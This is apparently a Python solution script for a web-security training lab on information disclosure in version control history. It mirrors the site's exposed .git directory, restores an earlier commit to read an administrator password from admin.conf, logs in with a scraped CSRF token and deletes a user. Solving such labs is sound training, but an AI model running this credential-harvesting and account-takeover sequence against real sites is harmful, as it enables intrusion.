####################################################################
#
# Lab: Information disclosure in version control history
#
# Hack Steps: 
#      1. Fetch the .git directory
#      2. Reset to the previous commit
#      3. Get the administrator password from the admin.conf file
#      4. Login as administrator
#      5. Delete carlos
#
####################################################################
import requests
import re
from colorama import Fore
import os

# Change this to your lab DOMAIN
LAB_DOMAIN = "0ac000d603580efc82f0425700fe0069.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching .git directory (wait a minute).. ")

    os.system(f"wget -r https://{LAB_DOMAIN}/.git")

    print(Fore.WHITE + "⦗2⦘ Changing current working directory.. ", end="", flush=True)
    
    os.chdir(LAB_DOMAIN)

    print(Fore.GREEN + "OK")

    os.system("git reset --hard HEAD~1")

    print(Fore.WHITE + "⦗3⦘ Resetting to the previous commit.. " + Fore.GREEN + "OK" )
    print(Fore.WHITE + "⦗4⦘ Reading admin.conf file.. ", end="", flush=True)
    
    admin_conf = open("admin.conf").readline()
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the administrator password.. ", end="", flush=True)

    first_line = admin_conf.splitlines()[0]
    admin_pass = first_line.split("=")[1]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)
    print(Fore.WHITE + "⦗6⦘ Fetching the login page to get a valid session and csrf token.. ", end="", flush=True)

    login_page = fetch("/login")

    session = login_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Logging in as administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_pass, "csrf": csrf }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Deleting carlos.. ", end="", flush=True)
    
    new_session = login_as_wiener.cookies.get("session") 
    cookies = { "session": new_session }
    fetch("/admin/delete?username=carlos", cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"https://{LAB_DOMAIN}{path}", cookies=cookies)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"https://{LAB_DOMAIN}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()